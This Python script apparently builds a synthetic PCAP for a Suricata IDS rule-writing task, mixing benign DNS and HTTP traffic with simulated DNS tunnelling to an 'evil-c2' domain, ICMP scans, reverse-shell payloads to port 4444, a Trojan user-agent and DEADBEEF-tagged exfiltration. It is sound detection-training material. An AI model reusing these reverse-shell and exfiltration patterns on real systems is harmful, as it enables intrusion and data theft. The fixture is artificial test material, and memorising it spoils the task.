#!/usr/bin/env python3
"""Generate incident PCAP file with mixed benign and malicious traffic patterns
for Suricata IDS rule engineering task."""
import os
from scapy.all import IP, UDP, TCP, ICMP, DNS, DNSQR, Raw, wrpcap, conf

conf.verb = 0

packets = []

# ============================================================
# Normal DNS queries from internal user (benign baseline)
# ============================================================
for i, domain in enumerate(["www.google.com", "github.com",
                             "api.example.com", "cdn.cloudflare.com"]):
    packets.append(
        IP(src="10.0.0.50", dst="8.8.8.8") /
        UDP(sport=10000 + i, dport=53) /
        DNS(id=100 + i, rd=1, qd=DNSQR(qname=domain, qtype="A"))
    )

# ============================================================
# DNS tunneling from compromised host (C2 beaconing)
# Long base64-encoded subdomain labels under evil-c2.example.net
# ============================================================
tunnel_domains = [
    "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q.c2VjcmV0LWRhdGEtZXhmaWx0cmF0aW9u.evil-c2.example.net",
    "dGhpcyBpcyBhbm90aGVyIGxvbmcgZW5jb2RlZA.c3RyaW5nIHRoYXQgbG9va3MgbGlrZQ.evil-c2.example.net",
    "YmFzZTY0IGVuY29kZWQgZGF0YSBiZWluZw.ZXhmaWx0cmF0ZWQgdmlhIGRucyBxdWVyaWVz.evil-c2.example.net",
]
for i, domain in enumerate(tunnel_domains):
    packets.append(
        IP(src="10.0.0.100", dst="8.8.8.8") /
        UDP(sport=20000 + i, dport=53) /
        DNS(id=200 + i, rd=1, qd=DNSQR(qname=domain, qtype="A"))
    )

# ============================================================
# DNS from trusted monitoring host (must be suppressed)
# Includes one query to evil-c2 domain to test suppression
# ============================================================
for i, domain in enumerate(["www.google.com",
                             "aGVsbG8gd29ybGQ.evil-c2.example.net"]):
    packets.append(
        IP(src="10.0.0.1", dst="8.8.8.8") /
        UDP(sport=30000 + i, dport=53) /
        DNS(id=300 + i, rd=1, qd=DNSQR(qname=domain, qtype="A"))
    )

# ============================================================
# ICMP scanning from 8 external sources, 3 packets each
# ============================================================
scanner_ips = ["192.168.1.10", "192.168.1.20", "192.168.1.30",
               "192.168.1.40", "192.168.1.50", "192.168.1.60",
               "192.168.1.70", "192.168.1.80"]
for src_ip in scanner_ips:
    for j in range(3):
        packets.append(
            IP(src=src_ip, dst="10.0.0.1") /
            ICMP(type=8, code=0, id=0x1234, seq=j) /
            Raw(load=b"SCAN" * 4)
        )

# ============================================================
# ICMP from trusted host (must be suppressed)
# ============================================================
for j in range(5):
    packets.append(
        IP(src="10.0.0.1", dst="10.0.0.50") /
        ICMP(type=8, code=0, id=0x5678, seq=j) /
        Raw(load=b"PING" * 4)
    )

# ============================================================
# Reverse Shell A: compromised host -> attacker C2 on port 4444
# Full TCP handshake + shell invocation payload
# ============================================================
src, dst = "10.0.0.100", "203.0.113.50"
sport, dport = 54321, 4444
seq_c, seq_s = 1000, 2000
packets.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="S", seq=seq_c))
packets.append(IP(src=dst, dst=src) / TCP(sport=dport, dport=sport, flags="SA", seq=seq_s, ack=seq_c + 1))
packets.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="A", seq=seq_c + 1, ack=seq_s + 1))
packets.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="PA", seq=seq_c + 1, ack=seq_s + 1) / Raw(load=b"/bin/sh -i 2>&1\n"))

# ============================================================
# Reverse Shell B: second compromised host -> different C2
# ============================================================
src2, dst2 = "10.0.0.101", "203.0.113.51"
sport2, seq_c2, seq_s2 = 54322, 3000, 4000
packets.append(IP(src=src2, dst=dst2) / TCP(sport=sport2, dport=4444, flags="S", seq=seq_c2))
packets.append(IP(src=dst2, dst=src2) / TCP(sport=4444, dport=sport2, flags="SA", seq=seq_s2, ack=seq_c2 + 1))
packets.append(IP(src=src2, dst=dst2) / TCP(sport=sport2, dport=4444, flags="A", seq=seq_c2 + 1, ack=seq_s2 + 1))
packets.append(IP(src=src2, dst=dst2) / TCP(sport=sport2, dport=4444, flags="PA", seq=seq_c2 + 1, ack=seq_s2 + 1) / Raw(load=b"/bin/bash -c 'exec /bin/sh -i'\n"))

# ============================================================
# Normal HTTP request (benign baseline)
# ============================================================
src3, dst3 = "10.0.0.50", "93.184.216.34"
sport3, seq_c3, seq_s3 = 45678, 5000, 6000
packets.append(IP(src=src3, dst=dst3) / TCP(sport=sport3, dport=80, flags="S", seq=seq_c3))
packets.append(IP(src=dst3, dst=src3) / TCP(sport=80, dport=sport3, flags="SA", seq=seq_s3, ack=seq_c3 + 1))
packets.append(IP(src=src3, dst=dst3) / TCP(sport=sport3, dport=80, flags="A", seq=seq_c3 + 1, ack=seq_s3 + 1))
http_normal = (
    b"GET / HTTP/1.1\r\n"
    b"Host: www.example.com\r\n"
    b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
    b"Accept: */*\r\n"
    b"\r\n"
)
packets.append(IP(src=src3, dst=dst3) / TCP(sport=sport3, dport=80, flags="PA", seq=seq_c3 + 1, ack=seq_s3 + 1) / Raw(load=http_normal))

# ============================================================
# HTTP with malicious Trojan User-Agent
# ============================================================
src4, dst4 = "10.0.0.200", "93.184.216.34"
sport4, seq_c4, seq_s4 = 45679, 7000, 8000
packets.append(IP(src=src4, dst=dst4) / TCP(sport=sport4, dport=80, flags="S", seq=seq_c4))
packets.append(IP(src=dst4, dst=src4) / TCP(sport=80, dport=sport4, flags="SA", seq=seq_s4, ack=seq_c4 + 1))
packets.append(IP(src=src4, dst=dst4) / TCP(sport=sport4, dport=80, flags="A", seq=seq_c4 + 1, ack=seq_s4 + 1))
http_trojan = (
    b"GET /update HTTP/1.1\r\n"
    b"Host: www.example.com\r\n"
    b"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Trojan.Downloader)\r\n"
    b"Accept: */*\r\n"
    b"\r\n"
)
packets.append(IP(src=src4, dst=dst4) / TCP(sport=sport4, dport=80, flags="PA", seq=seq_c4 + 1, ack=seq_s4 + 1) / Raw(load=http_trojan))

# ============================================================
# Binary exfiltration protocol on port 9999
# Magic bytes DEADBEEF followed by exfiltrated data
# Includes proper TCP teardown to avoid duplicate stream alerts
# ============================================================
src5, dst5 = "10.0.0.100", "198.51.100.10"
sport5, seq_c5, seq_s5 = 55555, 9000, 10000
packets.append(IP(src=src5, dst=dst5) / TCP(sport=sport5, dport=9999, flags="S", seq=seq_c5))
packets.append(IP(src=dst5, dst=src5) / TCP(sport=9999, dport=sport5, flags="SA", seq=seq_s5, ack=seq_c5 + 1))
packets.append(IP(src=src5, dst=dst5) / TCP(sport=sport5, dport=9999, flags="A", seq=seq_c5 + 1, ack=seq_s5 + 1))
binary_data = b"\xDE\xAD\xBE\xEF\x00\x10" + b"exfiltrated_data_here_1234567890"
packets.append(IP(src=src5, dst=dst5) / TCP(sport=sport5, dport=9999, flags="PA", seq=seq_c5 + 1, ack=seq_s5 + 1) / Raw(load=binary_data))
# Proper TCP FIN teardown to close the stream cleanly
data_len = len(binary_data)
packets.append(IP(src=src5, dst=dst5) / TCP(sport=sport5, dport=9999, flags="FA", seq=seq_c5 + 1 + data_len, ack=seq_s5 + 1))
packets.append(IP(src=dst5, dst=src5) / TCP(sport=9999, dport=sport5, flags="FA", seq=seq_s5 + 1, ack=seq_c5 + 1 + data_len + 1))
packets.append(IP(src=src5, dst=dst5) / TCP(sport=sport5, dport=9999, flags="A", seq=seq_c5 + 1 + data_len + 1, ack=seq_s5 + 2))

# ============================================================
# Binary from trusted host (must be suppressed)
# Also includes proper TCP teardown
# ============================================================
src6 = "10.0.0.1"
sport6, seq_c6, seq_s6 = 55556, 11000, 12000
packets.append(IP(src=src6, dst=dst5) / TCP(sport=sport6, dport=9999, flags="S", seq=seq_c6))
packets.append(IP(src=dst5, dst=src6) / TCP(sport=9999, dport=sport6, flags="SA", seq=seq_s6, ack=seq_c6 + 1))
packets.append(IP(src=src6, dst=dst5) / TCP(sport=sport6, dport=9999, flags="A", seq=seq_c6 + 1, ack=seq_s6 + 1))
binary_trusted = b"\xDE\xAD\xBE\xEF\x00\x08" + b"trusted_monitoring_data"
packets.append(IP(src=src6, dst=dst5) / TCP(sport=sport6, dport=9999, flags="PA", seq=seq_c6 + 1, ack=seq_s6 + 1) / Raw(load=binary_trusted))
trusted_len = len(binary_trusted)
packets.append(IP(src=src6, dst=dst5) / TCP(sport=sport6, dport=9999, flags="FA", seq=seq_c6 + 1 + trusted_len, ack=seq_s6 + 1))
packets.append(IP(src=dst5, dst=src6) / TCP(sport=9999, dport=sport6, flags="FA", seq=seq_s6 + 1, ack=seq_c6 + 1 + trusted_len + 1))
packets.append(IP(src=src6, dst=dst5) / TCP(sport=sport6, dport=9999, flags="A", seq=seq_c6 + 1 + trusted_len + 1, ack=seq_s6 + 2))

os.makedirs("/app", exist_ok=True)
wrpcap("/app/incident.pcap", packets)
print(f"Generated {len(packets)} packets in /app/incident.pcap")
